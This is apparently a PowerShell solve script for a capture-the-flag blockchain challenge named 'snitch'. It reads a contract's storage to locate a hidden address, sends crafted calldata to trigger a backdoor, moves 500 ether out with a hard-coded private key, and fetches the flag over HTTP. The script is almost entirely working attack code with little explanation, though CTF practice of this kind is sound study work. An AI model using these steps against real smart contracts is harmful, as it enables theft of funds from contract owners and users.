# Powershell script to solve "snitch" challenge

# "cut" function to make it easier to parse output
function cut {
    param(
        [Parameter(ValueFromPipeline=$True)] [string]$inputobject,
        [string]$delimiter='\s+',
        [string[]]$field
    )

    process {
        if ($field -eq $null) { $inputobject -split $delimiter } else {
        ($inputobject -split $delimiter)[$field] }
    }
}

# init variables given by the challenge (change them)
$ip="54.228.89.246"
$env:ETH_RPC_URL="http://54.228.89.246/rpc"
$private_key="0x759954eb3aadbefbff72d6e8a9bd099bd9a070120edf3bc6e9a9f41ce7cdbbf5"
$my_address="0x5d4cBDB3cCcF48d9a4B4946795b4a71e970b5032"
$setup="0xdaf00B906865684578BEa20Aed633E63b721089b"

# checkout slot 0 of the setup contract
$slot=$(cast storage $setup 0)

# parse the slot to get rid of the static values in order to get the "snitch" address
$snitch="0x" + $(echo "$slot" | cut -f 1 -d '0x00000000000063' | cut -f 0 -d '3419010100')

# send data to "snitch" to trigger the backdoor and get the funds
cast send $snitch "0x490d2052414c4943455f49535f4730440000000000000000000000000000000000000000" --private-key $private_key

cast send 0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85 --value "500ether" --private-key $private_key

cmd.exe /c curl "http://$ip/flag"
